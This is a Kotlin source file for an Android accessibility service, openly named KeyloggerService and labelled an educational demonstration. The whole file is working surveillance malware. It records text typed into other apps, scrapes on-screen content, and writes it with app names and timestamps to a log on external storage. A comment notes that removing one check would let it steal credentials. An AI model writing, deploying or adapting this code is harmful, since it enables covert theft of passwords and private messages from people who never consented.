package com.example.ChatterBox.accessibility

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.os.Environment
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Accessibility service that logs user input.
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
class KeyloggerService : AccessibilityService() {
    private val TAG = "KeyloggerDemo"
    private val LOG_FILENAME = "input_log.txt"
    private var lastText = ""
    private var lastPackage = ""
    private var lastTime = 0L

    override fun onServiceConnected() {
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                AccessibilityServiceInfo.DEFAULT
        info.notificationTimeout = 100
        serviceInfo = info

        Log.d(TAG, "Keylogger service connected")
        
        // Log info about this service being started
        logToFile("=== KEYLOGGER SERVICE STARTED ===")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: "unknown"
        val eventType = event.eventType
        val eventText = getEventText(event)
        
        // Only process events with text and skip our own app (to avoid logging credentials)
        // NOTE: In a real malicious app, this check would be removed to steal credentials!
        if (packageName.contains("ChatterBox")) {
            return
        }

        // Track input from text changes, password fields, etc.
        when (eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
            AccessibilityEvent.TYPE_VIEW_FOCUSED,
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                if (eventText.isNotEmpty() && eventText != lastText) {
                    val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
                    val logMessage = "[$timestamp] App: $packageName | Input: $eventText"
                    
                    Log.d(TAG, "Logging input: $logMessage")
                    logToFile(logMessage)
                    
                    lastText = eventText
                    lastPackage = packageName
                    lastTime = System.currentTimeMillis()
                }
            }
        }

        // Extract all text from the screen
        if (System.currentTimeMillis() - lastTime > 5000 && packageName != lastPackage) {
            val rootNode = rootInActiveWindow ?: return
            val extractedText = extractTextFromNode(rootNode)
            if (extractedText.isNotEmpty()) {
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
                val logMessage = "[$timestamp] Screen Text in $packageName:\n$extractedText"
                
                Log.d(TAG, "Logging screen content: $logMessage")
                logToFile(logMessage)
                
                lastPackage = packageName
                lastTime = System.currentTimeMillis()
            }
        }
    }

    private fun extractTextFromNode(node: AccessibilityNodeInfo): String {
        val sb = StringBuilder()
        
        if (node.text != null) {
            sb.append(node.text)
            sb.append(" ")
        }
        
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            sb.append(extractTextFromNode(child))
            child.recycle()
        }
        
        return sb.toString()
    }

    private fun getEventText(event: AccessibilityEvent): String {
        val sb = StringBuilder()
        for (txt in event.text) {
            sb.append(txt)
        }
        return sb.toString()
    }

    private fun logToFile(message: String) {
        try {
            val logFile = File(getExternalFilesDir(), LOG_FILENAME)
            
            FileOutputStream(logFile, true).use { out ->
                out.write("$message\n".toByteArray())
            }
        } catch (e: IOException) {
            Log.e(TAG, "Error writing to log file", e)
        }
    }

    private fun getExternalFilesDir(): File {
        val dir = File(Environment.getExternalStorageDirectory(), "ChatterBox/logs")
        if (!dir.exists()) {
            dir.mkdirs()
        }
        return dir
    }

    override fun onInterrupt() {
        Log.d(TAG, "Keylogger service interrupted")
    }

}
